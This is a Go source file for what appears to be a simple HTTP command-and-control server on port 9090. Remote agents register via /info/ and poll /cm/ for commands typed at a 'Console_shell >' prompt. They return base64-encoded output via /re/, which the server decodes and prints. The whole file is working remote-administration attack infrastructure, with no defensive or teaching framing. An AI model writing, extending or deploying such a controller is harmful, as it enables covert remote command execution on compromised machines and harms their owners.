package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"regexp"

	"github.com/axgle/mahonia"
)

var (
	cmd    string = ""
	AGENTS map[string]string
)

//var COMMAND
//TIME := list.New()

func sayhelloName(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	//路由正则
	url_info, _ := regexp.Compile("/info/*")
	url_md, _ := regexp.Compile("/md/*")
	url_cm, _ := regexp.Compile("/cm/*")
	url_re, _ := regexp.Compile("/re/*")

	//url path
	//fmt.Println("URL_path", r.URL.Path)

	//路由/info/*
	if url_info.MatchString(r.URL.Path) {
		//匹配
		//r.ParseForm()
		//输出data
		data := mahonia.NewDecoder("gbk").ConvertString(string(r.Form.Get("data")))
		fmt.Println("Form", data)

		//fmt.Println("Form", data)
		AGENTS = make(map[string]string)
		url_path, _ := regexp.Compile(`[A-Z]+`)
		id := url_path.FindString(r.URL.Path)
		//fmt.Println(id)
		AGENTS[id] = "ok"
		// fmt.Println(AGENTS[id])

	} else if url_cm.MatchString(r.URL.Path) {
		//r.ParseForm()

		//命令实现需要配合输入
		url_path, _ := regexp.Compile(`[A-Z]+`)
		var id = url_path.FindString(r.URL.Path)
		_, ok := AGENTS[id]
		if ok {
			if cmd != "" {
				fmt.Fprint(w, cmd)
				cmd = ""
				_ = r.Close
			} else {
				fmt.Fprint(w, "")
			}
		} else {
			fmt.Fprintf(w, "REGISTER")

		}

	} else if url_re.MatchString(r.URL.Path) {
		//r.ParseForm()
		data := r.Form.Get("data")
		decoded, _ := base64.StdEncoding.DecodeString(data)
		decodestr := string(decoded)
		fmt.Println("\n")
		fmt.Println(decodestr)

	} else if url_md.MatchString(r.URL.Path) {
		//r.ParseForm()
		// data := r.Form.Get("data")
		fmt.Println("a")

	} else {
		//全都不匹配输出请求详细
		//先强制断开连接
		//fmt.Println(r.Close)
		////自动关闭服务器
		//
		//fmt.Println("Request解析")
		////HTTP方法
		//fmt.Println("method", r.Method)
		//// RequestURI是被客户端发送到服务端的请求的请求行中未修改的请求URI
		//fmt.Println("RequestURI", r.RequestURI)
		////URL类型,下方分别列出URL的各成员
		//fmt.Println("URL_scheme", r.URL.Scheme)
		//fmt.Println("URL_opaque", r.URL.Opaque)
		//fmt.Println("URL_user", r.URL.User.String())
		//fmt.Println("URL_host", r.URL.Host)
		//fmt.Println("URL_path", r.URL.Path)
		//fmt.Println("URL_RawQuery", r.URL.RawQuery)
		//fmt.Println("URL_Fragment", r.URL.Fragment)
		////协议版本
		//fmt.Println("proto", r.Proto)
		//fmt.Println("protomajor", r.ProtoMajor)
		//fmt.Println("protominor", r.ProtoMinor)
		//
		////打印全部头信息
		//for k, v := range r.Header {
		//	// fmt.Println("Header key:" + k)
		//	for _, vv := range v {
		//		fmt.Println("header key:" + k + "  value:" + vv)
		//	}
		//}
		//
		////解析body
		////r.ParseMultipartForm(128)
		////fmt.Println("解析方式:ParseMultipartForm")
		//r.ParseForm()
		//fmt.Println("解析方式:ParseForm")
		//
		////body内容长度
		//fmt.Println("ContentLength", r.ContentLength)
		//
		////打印全部内容
		//fmt.Println("Form", r.Form)
		//
		////该请求的来源地址
		//fmt.Println("RemoteAddr", r.RemoteAddr)
		//
		/////data:=r.RemoteAddr
		////发送邮件通知
		////SendMail("Danger notice ！！！！",data)
		////os.Exit(0)
		fmt.Fprintf(w, "") //这个写入到w的是输出到客户端的
	}

	//fmt.Fprintf(w, "Hello Wrold!") //这个写入到w的是输出到客户端的
}

//func SendMail(subject string, body string ) error {
//    //定义邮箱服务器连接信息
//    mailConn := map[string]string {
//        "user": "",
//        "pass": "",
//        "host": "",
//        "port": "",
//    }
//
//    port, _ := strconv.Atoi(mailConn["port"]) //转换端口类型为int
//
//    m := gomail.NewMessage()
//    m.SetHeader("Subject", subject)  //设置邮件主题
//    m.SetBody("text/html", body)     //设置邮件正文
//
//    d := gomail.NewDialer(mailConn["host"], port, mailConn["user"], mailConn["pass"])
//
//    err := d.DialAndSend(m)
//    return err
//
//}

//func CMD() {
//
//	fmt.Printf("Console_shell >")
//	fmt.Scanln(&cmd) //Scanln 扫描来自标准输入的文本，将空格分隔的值依次存放到后续的参数内，直到碰到换行。
//	// fmt.Scanf("%s %s", &firstName, &lastName)    //Scanf与其类似，除了 Scanf 的第一个参数用作格式字符串，用来决定如何读取。
//
//	fmt.Printf("%s \n", cmd)
//	fmt.Println(cmd)
//
//}
func Scanf(a *string) {
	reader := bufio.NewReader(os.Stdin)
	data, _, _ := reader.ReadLine()
	*a = string(data)
}
func main() {
	http.HandleFunc("/", sayhelloName) //设置访问的路由

	go http.ListenAndServe(":9090", nil) //设置监听的端口
	//commline:=""
	//cmd_list:=""
	for true {

		fmt.Print("Console_shell >")
		Scanf(&cmd)
		// fmt.Printf("%s \n", cmd)
	}

}
